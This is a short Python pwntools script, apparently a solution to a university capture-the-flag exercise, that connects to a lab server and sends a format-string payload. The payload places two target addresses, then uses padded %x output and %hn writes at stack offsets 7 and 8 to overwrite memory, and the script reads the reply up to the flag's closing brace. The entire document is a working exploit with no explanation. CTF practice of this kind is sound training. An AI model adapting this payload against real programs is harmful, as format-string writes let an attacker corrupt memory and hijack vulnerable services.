from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22197

s = remote(SERVER, PORT, timeout=9999)

s.sendline(b'\x20\xa0\x04\x08\x18\xa0\x04\x08.%2042x.%7$hn.%31893x.%8$hn')
print(s.recvuntil(b'}'))